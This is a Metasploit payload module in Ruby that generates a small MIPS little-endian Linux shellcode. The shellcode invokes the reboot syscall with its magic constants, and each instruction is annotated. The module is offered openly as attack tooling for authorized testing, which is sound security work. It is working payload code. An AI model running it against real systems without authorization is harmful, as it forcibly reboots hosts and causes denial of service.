##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 32

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Reboot',
      'Description'   => %q{
            A very small shellcode for rebooting the system.
            This payload is sometimes helpful for testing purposes.
         },
      'Author'        =>
        [
          'Michael Messner <devnull[at]s3cur1ty.de>', #metasploit payload
          'rigan - <imrigan[at]gmail.com>'  #original payload
        ],
      'References'    =>
        [
          ['URL', 'http://www.shell-storm.org/shellcode/files/shellcode-795.php']
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSLE,
      'Payload'       =>
        {
          'Offsets' => {} ,
          'Payload' => ''
        })
    )
  end

  def generate
    shellcode =
      "\x21\x43\x06\x3c" +  # lui     a2,0x4321
      "\xdc\xfe\xc6\x34" +  # ori     a2,a2,0xfedc
      "\x12\x28\x05\x3c" +  # lui     a1,0x2812
      "\x69\x19\xa5\x34" +  # ori     a1,a1,0x1969
      "\xe1\xfe\x04\x3c" +  # lui     a0,0xfee1
      "\xad\xde\x84\x34" +  # ori     a0,a0,0xdead
      "\xf8\x0f\x02\x24" +  # li      v0,4088
      "\x0c\x01\x01\x01"    # syscall 0x40404

    return super + shellcode
  end
end
